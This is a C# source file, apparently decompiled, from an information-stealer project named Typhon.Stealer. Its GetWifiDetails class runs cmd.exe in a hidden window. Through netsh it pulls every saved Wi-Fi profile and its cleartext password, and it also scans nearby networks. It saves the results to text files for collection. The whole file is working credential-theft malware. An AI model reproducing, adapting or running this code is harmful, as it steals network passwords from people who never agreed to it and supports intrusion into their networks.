using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x0200000D RID: 13
	internal class GetWifiDetails
	{
		// Token: 0x06000048 RID: 72 RVA: 0x0000404C File Offset: 0x0000224C
		private static string R(string cmd, bool wait = true)
		{
			string result = "";
			using (Process process = new Process())
			{
				process.StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = cmd,
					RedirectStandardError = true,
					RedirectStandardOutput = true
				};
				process.Start();
				result = process.StandardOutput.ReadToEnd();
				if (wait)
				{
					process.WaitForExit();
				}
			}
			return result;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000040E0 File Offset: 0x000022E0
		private static string[] GetProfiles()
		{
			string[] array = GetWifiDetails.R("/C chcp 65001 && netsh wlan show profile | findstr All", true).Split(new char[]
			{
				'\r',
				'\n'
			}, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
			}
			return array;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x0000413A File Offset: 0x0000233A
		private static string GetPassword(string profile)
		{
			return GetWifiDetails.R("/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key", true).Split(new char[]
			{
				':'
			}).Last<string>().Trim();
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000416C File Offset: 0x0000236C
		public static void ScanningNetworks(string sSavePath)
		{
			string contents = GetWifiDetails.R("/C chcp 65001 && netsh wlan show networks mode=bssid", true);
			File.AppendAllText(sSavePath + "\\Scanned Networks.txt", contents);
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004198 File Offset: 0x00002398
		public static void SavedNetworks(string sSavePath)
		{
			foreach (string text in GetWifiDetails.GetProfiles())
			{
				if (!text.Equals("65001"))
				{
					Counter.SavedWifiNetworks++;
					string password = GetWifiDetails.GetPassword(text);
					string contents = string.Concat(new string[]
					{
						"Wifi name: ",
						text,
						"\nPassword: ",
						password,
						"\n\n"
					});
					File.AppendAllText(sSavePath + "\\Wifi Passwords.txt", contents);
				}
			}
		}
	}
}
